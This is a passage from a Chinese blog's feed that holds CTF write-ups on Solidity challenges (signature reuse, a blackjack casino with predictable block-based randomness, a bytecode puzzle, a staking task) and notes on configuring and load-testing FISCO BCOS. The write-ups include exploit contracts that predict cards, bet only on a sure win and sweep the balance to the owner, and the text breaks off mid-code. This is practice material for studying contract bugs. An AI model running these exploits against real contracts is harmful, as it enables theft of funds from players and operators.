bytes32 messageHash) = _getSignerAndMessageHash(message);</span><br><span class="line">        require(signer == msg.sender, &quot;Invalid message&quot;);</span><br><span class="line">        csl = signer;</span><br><span class="line">        alreadyUsedMessageHash = messageHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toSolve(Message memory message) external &#123;</span><br><span class="line">        require(csl == msg.sender, &quot;Only CSL can open the box&quot;);</span><br><span class="line">        (address signer, bytes32 messageHash) = _getSignerAndMessageHash(message);</span><br><span class="line">        require(signer == msg.sender, &quot;No key No way&quot;);</span><br><span class="line">        require(messageHash != alreadyUsedMessageHash, &quot;used?&quot;);</span><br><span class="line">        isCompleted[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="我的解题：-1"><a href="#我的解题：-1" class="headerlink" title="我的解题："></a>我的解题：</h4><p>重点阅读代码中函数toSign()和toSolve()</p>
<p>了解到：</p>
<p>1.签名者必须是调用函数者</p>
<p>2.一个地址只能签一次(大概理解意思，不确定 但是看得出同一个不能签两次)</p>
<p>3.调用tosign（）时候地址未设置</p>
<p><code>csl == address(0)</code></p>
<p><strong>思路：</strong></p>
<ol>
<li><p>先Deploy（）</p>
</li>
<li><p>应该是tosign和tosolve的签名不能重复</p>
</li>
<li><p>得到与keccak256(abi.encodePacked(…))一样 的哈希值</p>
</li>
<li><p>总结&amp;构造一下这个合约所需要的签名参数</p>
<p>(根据getMessageHash())</p>
<p>{</p>
<ul>
<li><p>“I want to open the magic box”</p>
</li>
<li><p>addr(我的地址  msg.sender)</p>
</li>
<li><p>c_addr（challenge地址，deploy得到</p>
</li>
<li><p>chainId</p>
</li>
</ul>
<p>}</p>
</li>
<li></li>
</ol>
<p>过程：</p>
<p>1.部署Deployer合约</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250418185608031.png" alt="image-20250418185608031"></p>
<p>得到：</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250419111245286.png" alt="image-20250419111245286"></p>
<ol start="2">
<li><p>然后签名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hash = web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(</span><br><span class="line">  <span class="string">&quot;I want to open the magic box&quot;</span>,</span><br><span class="line">  	addr,      </span><br><span class="line">    c_addr, </span><br><span class="line">    chainId   </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> signature = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sign</span>(hash, userAddress);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>签名后得到v,r,s</p>
</li>
<li><p>换个ID再签名</p>
</li>
</ol>
<h4 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h4>]]></content>
  </entry>
  <entry>
    <title>配置管理与测试</title>
    <url>/2025/03/06/%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E4%B8%8E%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h2 id="Fisco-BCOS-配置管理"><a href="#Fisco-BCOS-配置管理" class="headerlink" title="Fisco BCOS 配置管理"></a>Fisco BCOS 配置管理</h2><h3 id="节点配置"><a href="#节点配置" class="headerlink" title="节点配置"></a>节点配置</h3><p>介绍了节点和账本配置方法，包括端口、证书、日志、群组、共识、存储、交易池、同步、流控等配置项。</p>
<p>FISCO BCOS支持<strong>多账本</strong>，每条链包括多个独立账本，账本间数据相互隔离，群组间交易处理相互隔离，每个节点包括一个主配置<code>config.ini</code>和多个账本配置 <code>group.group_id.genesis</code> <code>group.group_id.ini </code>。</p>
<p><strong>config.ini</strong>:主配置文件，主要配置RPC、P2P、SSL证书、账本配置文件路径、兼容性等信息。</p>
<p><strong>group.group_id.genesis</strong> ∶群组配置文件，群组内所有节点一致，节点启动后，不可手动更改该配置。主要包括群组共识算法、存储类型、最大gas限制等配置项。</p>
<p><strong>group.group_id.ini</strong>:群组可变配置文件，包括交易池大小等，配置后重启节点生效。</p>
<h4 id="关于配置"><a href="#关于配置" class="headerlink" title="关于配置"></a><strong>关于配置</strong></h4><p><strong>配置P2P：</strong></p>
<p>当前版本FISCO BCOS必须在config.ini配置中配置连接节点的P和Port，P2P相关配置包括:</p>
<p>• <strong>listen_ip</strong> : P2P监听IP，默认设置为0.e.0.0 。</p>
<p>• <strong>listen_port</strong>:节点P2P监听端口。</p>
<p>• **node, ***︰节点需连接的所有节点 ip:Port或DomainName:Port。该选项支持域名，但建议需</p>
<p>要使用的用户手动编译源码。</p>
<p><strong>配置账本文件路径：</strong></p>
<p>[group]配置本节点所属的所有群组配置路径︰</p>
<p>• <strong>group_data_path</strong>:群组数据存储路径。</p>
<p>• <strong>group_config_path</strong>:群组配置文件路径。</p>
<p><strong>配置证书信息：</strong></p>
<p>基于安全考虑，FISCO BCOS节点间采用SSL加密通信，[network_security]配置SSL连接的证书信息</p>
<p>• data_path : 证书和私钥文件所在目录。</p>
<p>• key : 节点私钥相对于data_path 的路径。</p>
<p>• cert : 证书node.crt相对于data_path的路径。</p>
<p>• ca_cert : ca证书文件路径。</p>
<p>• ca_path : ca证书文件夹，多ca时需要。</p>
<p><strong>配置黑名单列表</strong></p>
<p>cr1.idx:黑名单节点的Node lD,节点Node ID可通过 node .nodeid文件获取; icx是黑名单节点的索引。</p>
<p><strong>配置日志信息</strong></p>
<p><strong>配置节点兼容性</strong></p>
<p><a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/configuration.html">https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/configuration.html</a></p>
<h3 id="组员（群组系统）配置"><a href="#组员（群组系统）配置" class="headerlink" title="组员（群组系统）配置"></a>组员（群组系统）配置</h3><p>介绍了组员节点的加入和推出方法，包括节点加入&#x2F;退出网络、节点加入&#x2F;推出群组、转化成共识节点、观察者节点及游离节点等操作</p>
<h4 id="共识配置"><a href="#共识配置" class="headerlink" title="共识配置"></a><strong>共识配置</strong></h4><p>[consensus]涉及共识相关配置，包括：</p>
<p>• consensus_type：共识算法类型，目前支持PBFT，Raft和rPBFT，默认使用PBFT共识算法；</p>
<p>• max_trans_num：一个区块可打包的最大交易数，默认是1000，链初始化后，可通过控制</p>
<p>台动态调整该参数；</p>
<p>• consensus_timeout：PBFT共识过程中，每个区块执行的超时时间，默认为3s，单位为秒，</p>
<p>可通过控制台动态调整该参数；</p>
<p>• node.idx：共识节点列表，配置了参与共识节点的Node ID，节点的Node ID可通过</p>
<p>${data_path}&#x2F;node.nodeid文件获取(其中${data_path}可通过主配置config.ini的</p>
<p>[network_security].data_path配置项获取)</p>
<h4 id="状态模式配置"><a href="#状态模式配置" class="headerlink" title="状态模式配置"></a><strong>状态模式配置</strong></h4><p>• state用于存储区块链状态信息，位于genesis文件中[state]：</p>
<p>• type：state类型，目前支持storage state和MPT state，默认为storage state，storage</p>
<p>state将交易执行结果存储在系统表中，效率较高，MPT state将交易执行结果存储在MPT树</p>
<p>中，效率较低，但包含完整的历史信息。</p>
<h4 id="gas配置"><a href="#gas配置" class="headerlink" title="gas配置"></a><strong>gas配置</strong></h4><p>FISCO BCOS兼容以太坊虚拟机(EVM)，为了防止针对EVM的DOS攻击，EVM在执行交易时，引入了gas概念，用来度量智能合约执行过程中消耗的计算和存储资源，包括交易最大gas限制和区块最大gas限制，若交易或区块执行消耗的gas超过限制(gas limit)，则丢弃交易或区块。</p>
<p>FISCO BCOS是联盟链，简化了gas设计，<strong>仅保留交易最大gas限制，区块最大gas通过共识配置的max_trans_num和交易最大gas限制一起约束。</strong>FISCO BCOS通过genesis的[tx].gas_limit来配置交易最大gas限制，默认是300000000，链初始化完毕后，可通过控制台指令动态调整gas限制。</p>
<h4 id="EVM配置"><a href="#EVM配置" class="headerlink" title="EVM配置"></a><strong>EVM配置</strong></h4><p>FISCO BCOS v2.4.0引入Free Storage Gas衡量模式，提升CPU和内存在Gas消耗中的占比。</p>
<p><strong>Free Storage Gas模式的开启和关闭通过genesis文件的evm.enable_free_storage配置项控制。</strong></p>
<p>• evm.enable_free_storage设置为true：开启Free Storage Gas模式</p>
<h4 id="账本可变配置说明"><a href="#账本可变配置说明" class="headerlink" title="账本可变配置说明"></a><strong>账本可变配置说明</strong></h4><p><strong>数据库相关配置项</strong></p>
<p>• scroll_threshold_multiple：当type为Scalable时，此配置项用于配置区块数据库的切换阈</p>
<p>值，按scroll_threshold_multiple*1000。默认为2，区块数据按每2000块存储在不同的</p>
<p>RocksDB实例中。</p>
<p>• db_ip：当type为MySQL时，需要配置该字段，表示MySQL的IP地址。</p>
<p>• db_port：当type为MySQL时，需要配置该字段，表示MySQL的端口号。</p>
<p>• db_username：当type为MySQL时，需要配置该字段，表示MySQL的用户名。</p>
<p>• db_passwd：当type为MySQL时，需要配置该字段，表示MySQL用户对应的密码。</p>
<p>• db_name：当type为MySQL时，需要配置该字段，表示MySQL中使用的数据库名。</p>
<p>• init_connections：当type为MySQL时，可选配置该字段，表示与MySQL建立的初始连接数，默认15。使用默认值即可。</p>
<p>• max_connections：当type为MySQL时，可选配置该字段，表示与MySQL建立的最大连接数，默认20。使用默认值即可。</p>
<p><strong>交易池配置</strong></p>
<p>FISCO BCOS将交易池容量配置开放给用户，用户可根据自己的业务规模需求、稳定性需求以</p>
<p>及节点的硬件配置动态调整交易池配置。</p>
<p><strong>交易池容量限制</strong></p>
<p>为防止过多交易堆积在交易池内占用太多内存，FISCO BCOS提供了[tx_pool].limit和</p>
<p>[tx_pool].memory_limit两个配置项来限制交易池容量：</p>
<p>• [tx_pool].limit: 限制交易池内可以容纳的最大交易数目，默认为150000，超过该限制后，客户端发到节点的交易会被拒绝。</p>
<p>• [tx_pool].memory_limit: 交易池内交易占用的内存大小限制，默认为512MB，超过该限制后，客户端发到节点的交易会被拒绝。</p>
<p><strong>交易池推送线程数配置</strong></p>
<p>为提升区块链系统性能，FISCO BCOS采用了交易回执异步推送逻辑，当交易上链后，交易池内的推送线程会把交易上链的回执异步推送给客户端，为防止推送线程过多占用较多的系统资源，也为了防止推送线程过少影响交易推送的时效性，FISCO BCOS提供了</p>
<p>[tx_pool].notify_worker_num配置项来配置异步推送线程数目：</p>
<p>• [tx_pool].notify_worker_num：异步推送线程数目，默认为2，建议该值不超过8</p>
<h5 id="组员节点管理"><a href="#组员节点管理" class="headerlink" title="组员节点管理"></a><strong>组员节点管理</strong></h5><p>FISCO BCOS引入了游离节点、观察者节点和共识节点，这三种节点类型可通过控制台相互转换。</p>
<p>• <strong>组员</strong></p>
<p>共识节点：参与共识的节点，拥有群组的所有数据（搭链时默认都生成共识节点）。</p>
<p>观察者节点：不参与共识，但能实时同步链上数据的节点。</p>
<p>• <strong>非组员</strong></p>
<p>游离节点：已启动，待等待加入群组的节点。处在一种暂时的节点状态，不能获取链上的数据<strong>。</strong></p>
<h3 id="配置CA黑白名单"><a href="#配置CA黑白名单" class="headerlink" title="配置CA黑白名单"></a>配置CA黑白名单</h3><p>介绍了如何通过配置CA黑白名单，实现拒绝与无关的链的节点或指定节点建立连接，或实现仅允许与白名单中的节点建立链接。</p>
<h3 id="存储加密"><a href="#存储加密" class="headerlink" title="存储加密"></a>存储加密</h3><p>介绍了设置落盘加密的流程，保证了运行联盟链的数据在硬盘上的安全性</p>
<h3 id="账户权限控制"><a href="#账户权限控制" class="headerlink" title="账户权限控制"></a>账户权限控制</h3><p>介绍了基于角色的账户权限控制方法。</p>
<h3 id="设置SDK白名单"><a href="#设置SDK白名单" class="headerlink" title="设置SDK白名单"></a>设置SDK白名单</h3><p>介绍了设计节点所服务的SDK证书白名单方法。</p>
<h2 id="Fisco-BCOS-测试"><a href="#Fisco-BCOS-测试" class="headerlink" title="Fisco BCOS 测试"></a>Fisco BCOS 测试</h2><h3 id="1-通过Java-SDK进行压力测试"><a href="#1-通过Java-SDK进行压力测试" class="headerlink" title="1.通过Java SDK进行压力测试"></a>1.通过Java SDK进行压力测试</h3><p>（以在Ubuntu系统中安装OpenJDK 11为例）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装open JDK 11</span><br><span class="line">$ sudo apt install openjdk-11-jdk</span><br><span class="line"># 验证Java版本</span><br><span class="line">$ java --version</span><br><span class="line"># 输出以下内容：</span><br><span class="line"># openjdk 11.0.10 2021-01-19</span><br><span class="line"># OpenJDK Runtime Environment (build 11.0.10+9-Ubuntu-0ubuntu1.20.04)</span><br><span class="line"># OpenJDK 64-Bit Server VM (build 11.0.10+9-Ubuntu-0ubuntu1.20.04, mixed mode, sharing)</span><br></pre></td></tr></table></figure>

<p><strong>编译源码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下载源码</span><br><span class="line">$ git clone https://github.com/FISCO-BCOS/java-sdk-demo</span><br><span class="line">$ cd java-sdk-demo</span><br><span class="line"># 切换到2.0版本</span><br><span class="line">$ git checkout main-2.0</span><br><span class="line"># 编译源码</span><br><span class="line">$ ./gradlew build</span><br></pre></td></tr></table></figure>

<p><strong>配置Demo</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd dist</span><br><span class="line"># 拷贝证书(假设SDK证书位于~/fisco/nodes/127.0.0.1/sdk目录，请根据实际情况更改路径)</span><br><span class="line">$ cp -r ~/fisco/nodes/127.0.0.1/sdk/* conf</span><br><span class="line"># 拷贝配置文件</span><br><span class="line"># 注:</span><br><span class="line"># 默认搭建的FISCO BCOS区块链系统Channel端口是20200，若修改了该端口，请同步修改config.toml</span><br><span class="line">中的[network.peers]配置选项</span><br><span class="line">$ cp conf/config-example.toml conf/config.toml</span><br></pre></td></tr></table></figure>

<p><strong>执行示例压力测试程序</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CRUD测试插入1000笔#CRUD合约压测</span><br><span class="line"># 压测CRUD insert</span><br><span class="line"># count:压测的交易总量#tps:压测QPS</span><br><span class="line"># groupId:压测群组</span><br><span class="line">java -cp &#x27;conf/: lib/*: apps/*’ org.fisco. bcos. sdk.demo. perf. PerformanceTable</span><br><span class="line">[insert] [count][tps)</span><br><span class="line">[groupId]</span><br><span class="line">示例</span><br><span class="line">java -cp &#x27;conf/: lib/*:apps/*’ org.fisco.bcos. sdk. demo. perf.PerformanceTable</span><br><span class="line">insert 1000 100 1</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次题解03</title>
    <url>/2025/05/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A2%98%E8%A7%A303/</url>
    <content><![CDATA[<h2 id="4-Casino-BLACKJACK"><a href="#4-Casino-BLACKJACK" class="headerlink" title="4.Casino_BLACKJACK"></a>4.Casino_BLACKJACK</h2><h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;./casino.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    using Deck for *;</span><br><span class="line">    Casino public casino;</span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">    constructor(Casino _casino) &#123;</span><br><span class="line">        casino = _casino;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _calculateScore(uint8[] memory cards) internal pure returns (uint8, uint8) &#123;</span><br><span class="line">        uint8 score = 0;</span><br><span class="line">        uint8 scoreBig = 0; // in case of Ace there could be 2 different scores</span><br><span class="line">        bool bigAceUsed = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; cards.length; ++i) &#123;</span><br><span class="line">            uint8 card = cards[i];</span><br><span class="line">            if (Deck.isAce(card) &amp;&amp; !bigAceUsed) &#123;</span><br><span class="line">                // doesn&#x27;t make sense to use the second Ace as 11, because it leads to the losing</span><br><span class="line">                scoreBig += Deck.valueOf(card, true);</span><br><span class="line">                bigAceUsed = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                scoreBig += Deck.valueOf(card, false);</span><br><span class="line">            &#125;</span><br><span class="line">            score += Deck.valueOf(card, false);</span><br><span class="line">        &#125;</span><br><span class="line">        return (score, scoreBig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="我的思路"><a href="#我的思路" class="headerlink" title="我的思路"></a>我的思路</h4><p>阅读代码 发现给player随机牌是通过block.number和block.timestamp生成的，但是这两参数不是随机的，是可以知晓的，也就是说这个“随机牌”不随机哈</p>
<p>经常玩黑杰克的朋友都知道，要想自己手中牌接近21点且不爆，就需要合理的要牌停牌，在我们知道其他player的随机牌后 就可以根据这个“合理”的要牌停牌了。再看得分规则，和传统黑杰克相似，</p>
<p>除了赔付规则变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) &#123;//等于21</span><br><span class="line">				if(game.playerCards.length == 2 &amp;&amp; (Deck.isTen(ga\me.playerCards[0]) || Deck.isTen(game.playerCards[1]))) &#123;</span><br><span class="line">					if(!payable(msg.sender).send((game.bet * 5) / 2)) revert();&#125;</span><br><span class="line">//始手牌为ace+10点，赔2.5倍</span><br><span class="line">else &#123;</span><br><span class="line">					if(!payable(msg.sender).send(game.bet * 2)) revert();</span><br><span class="line">//&gt;2张所凑成的21，赔2倍</span><br><span class="line">				&#125;</span><br><span class="line">				games[msg.sender].state = GameState.Player;</span><br><span class="line">				return;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				if (playerScore &gt; BLACKJACK) &#123;</span><br><span class="line">					emit Log(1);</span><br><span class="line">					//爆、直接负</span><br><span class="line">					games[msg.sender].state = GameState.House; </span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前面还有一个关于庄贤平局的说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) &#123;</span><br><span class="line">			if (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) &#123;</span><br><span class="line">				if (!payable(msg.sender).send(game.bet)) revert();</span><br><span class="line">				games[msg.sender].state = GameState.Tie; </span><br><span class="line">				return;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				games[msg.sender].state = GameState.House;</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">//不知道有没有分牌平局 我没考虑这个</span><br></pre></td></tr></table></figure>

<p> 就是直接相等就平了（没有庄家大半点一说）</p>
<p><strong>直接返还双方本金</strong></p>
<p>那么如果我要赢：</p>
<ol>
<li>尽量拿到ace+10</li>
<li>让庄家爆牌（庄家的牌我们是能知道的）</li>
</ol>
<p><strong>思路：</strong></p>
<ol>
<li><p>开始游戏<code>Casino.deal()</code></p>
</li>
<li><p>通过<code>b.number</code>和<code>b.timestamp</code>算下一张牌</p>
</li>
<li><p>选择<code>hit</code> or<code>stand</code></p>
</li>
<li><p>直接让庄家爆牌</p>
</li>
</ol>
<p>获取庄家明牌:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint8 houseCard = casino.getHouseCard(0);</span><br></pre></td></tr></table></figure>



<p>算牌:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function predictCard(uint8 cardNumber) private view returns (uint8) &#123;</span><br><span class="line">        uint256 b = block.number;</span><br><span class="line">        uint256 timestamp = block.timestamp;</span><br><span class="line">        return uint8(uint256(keccak256(abi.encodePacked(blockhash(b), address(this), cardNumber, timestamp)) % 52);//一副牌去掉大小joker</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>计算下一张牌是否会让庄爆牌，会就让庄家摸牌</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint8 houseScore = getCardValue(houseCard);</span><br><span class="line">       uint8 nextCard = predictNextCard(3); </span><br><span class="line">       uint8 nextCardValue = getCardValue(nextCard);</span><br><span class="line">       </span><br><span class="line">       if (houseScore + nextCardValue &gt; 21) &#123;</span><br><span class="line">           casino.stand(); // 庄家必须抽牌</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           casino.hit();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>





<p><strong>过程：</strong></p>
<p> 1.deploy Casino.sol</p>
<p>得到<code>addr</code>:   </p>
<p>0xC3Ba5050Ec45990f76474163c5bA673c244aaECA</p>
<ol start="2">
<li><p>deploy hacker.sol</p>
<p>填入地址参数</p>
<p><img src="https://s2.loli.net/2025/05/24/4EI56LBvWpFZ2UG.png" alt="image.png"></p>
</li>
<li><p>开始攻击</p>
<p>(下注最小钱数)</p>
<p><img src="https://s2.loli.net/2025/05/24/scgomWIlKTvnepD.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2025/05/24/dcaFVWhDqmCH79I.png" alt="image.png"></p>
</li>
<li><p>可以再写一个自动转钱</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 balance = address(this).balance;</span><br><span class="line">(bool success, ) = owner.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">require(success, &quot;fail&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>forge test</p>
</li>
</ol>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p><strong>知识点 伪随机数</strong><br>解析：发牌过程在 Deck.deal() 函数内处理。发牌过程涉及计算 blockhash、玩家地址、已发牌数和 block.timestamp 的哈希。这是一个伪随机性，可以简单地通过等待所需的区块，根据新数据重新计算游戏结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//尝试获取一手得分为 21（即 Blackjack）的牌，如果成功，就调用 casino.deal&#123;value: 5 ether&#125;() 下注；否则，把攻击者发送的 msg.value 退回去，避免损失。</span><br><span class="line"></span><br><span class="line">function attack() public payable &#123;</span><br><span class="line"></span><br><span class="line">        uint8[] memory playerCards = new uint8[](2);//存储玩家的两张牌</span><br><span class="line">        playerCards[0] = Deck.deal(address(this), 0);</span><br><span class="line">        playerCards[1] = Deck.deal(address(this), 2);</span><br><span class="line">        </span><br><span class="line">        (uint8 score, uint8 scoreBig) = _calculateScore(playerCards);//判断能否达到21</span><br><span class="line"></span><br><span class="line">        if (scoreBig == 21 || score == 21) &#123;</span><br><span class="line">            casino.deal&#123;value: 5 ether&#125;();</span><br><span class="line">            //调用 casino.deal()下注</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            payable(msg.sender).transfer(msg.value);</span><br><span class="line">            //如果不是21点就退款</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-Dance"><a href="#5-Dance" class="headerlink" title="5. Dance"></a>5. Dance</h2><h3 id="题-1"><a href="#题-1" class="headerlink" title="题"></a>题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ByteDance &#123;</span><br><span class="line">    bool solved;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        solved = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkCode(address _yourContract) public &#123;</span><br><span class="line">       </span><br><span class="line">        require(!solved, &quot;Challenge already solved&quot;);</span><br><span class="line"></span><br><span class="line">        bytes memory code;</span><br><span class="line">        uint256 size;</span><br><span class="line">        bool hasDanceByte = false;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(_yourContract)</span><br><span class="line">            code := mload(0x40)</span><br><span class="line">            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">            mstore(code, size)</span><br><span class="line">            extcodecopy(_yourContract, add(code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line">        //上面的assemble就是将_yourContract的字节码复制到code</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; size; i++) &#123;</span><br><span class="line">            bytes1 b = code[i];</span><br><span class="line">            if (isByteDance(b)) &#123;</span><br><span class="line">                hasDanceByte = true;</span><br><span class="line">            &#125;</span><br><span class="line">            require(isOddByte(b), &quot;Byte is not odd&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        require(hasDanceByte, &quot;No palindrome byte found&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success,) = _yourContract.delegatecall(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOddByte(bytes1 b) public pure returns (bool) &#123;</span><br><span class="line">        return (uint8(b) % 2) == 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isByteDance(bytes1 b) public pure returns (bool) &#123;</span><br><span class="line"></span><br><span class="line">        bool isPal = true;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            let bVal := byte(0, b)</span><br><span class="line">            for &#123; let i := 0 &#125; lt(i, 4) &#123; i := add(i, 1) &#125;</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                let bitLeft := and(shr(sub(7, i), bVal), 0x01)</span><br><span class="line">                </span><br><span class="line">                let bitRight := and(shr(i, bVal), 0x01)</span><br><span class="line"></span><br><span class="line">                if iszero(eq(bitLeft, bitRight)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    isPal := 0</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return isPal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return solved;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>知识点：字节码问题 </p>
<p>解析：只需要构建正确的字节码0x611101611111611111035561ff，以及理解字节码逻辑就可以完成解题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract expoliter &#123;//0x611101611111611111035561ff   解决</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        bytes memory code = hex&#x27;611101611111611111035561ff&#x27;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            </span><br><span class="line">            return (add(code, 0x20), mload(code)) </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="6-stake"><a href="#6-stake" class="headerlink" title="6. stake"></a>6. stake</h2><h3 id="题-2"><a href="#题-2" class="headerlink" title="题"></a>题</h3><p>StakingReward合约用于为质押者分配奖励，你可以削减质押者应得的奖励吗？</p>
<p><strong>做题流程</strong>：</p>
<p><strong>remix</strong></p>
<ol>
<li>部署setUp1合约 （部署题目）</li>
<li>与第一步部署的合约交互</li>
<li>isSolved()返回true时视为完成题目</li>
</ol>
<p><strong>forge</strong></p>
<ol>
<li>在try_exploit函数代码注释下补充的攻击流程</li>
<li>运行<code>forge test</code> 测试test_solve通过视为完成题目</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.9;</span><br><span class="line">abstract contract ERC20 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    string private _name;</span><br><span class="line">    string private _symbol;</span><br><span class="line">    uint8 private _decimals;</span><br><span class="line"></span><br><span class="line">    constructor(string memory name_, string memory symbol_, uint8 decimals_) &#123;</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">        _decimals = decimals_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function name() public view virtual returns (string memory) &#123;</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">        return _decimals;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">        address owner = msg.sender;</span><br><span class="line">        _transfer(owner, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender</span><br><span class="line">    ) public view virtual returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span 